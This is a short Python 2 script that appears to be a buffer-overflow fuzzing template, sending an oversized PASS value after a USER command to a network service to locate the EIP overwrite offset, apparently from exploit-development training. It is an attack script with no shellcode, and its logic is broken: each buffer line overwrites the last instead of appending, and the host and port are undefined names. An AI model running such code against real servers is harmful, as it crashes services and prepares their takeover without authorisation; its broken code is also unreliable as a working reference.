#!/usr/bin/env python2

import socket

# Server Address
server = ip_address
# Server Port
port = app_port

buflen = 3000
# Fuzzing Strings
buffer = 'A' * 2706 # Buffer
buffer = 'B' * 4 # EIP location
buffer = 'C' * (buflen - len(buffer))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((server, port))

    # Receive server header
    r = s.recv(1024)

    # Send command
    s.send("USER Bob \r\n")

    # Receive the server response
    r = s.recv(1024)

    # Send buffer to vulnerable command
    s.send("PASS " + buffer + "\r\n")
except:
    print"Connection Error"
    
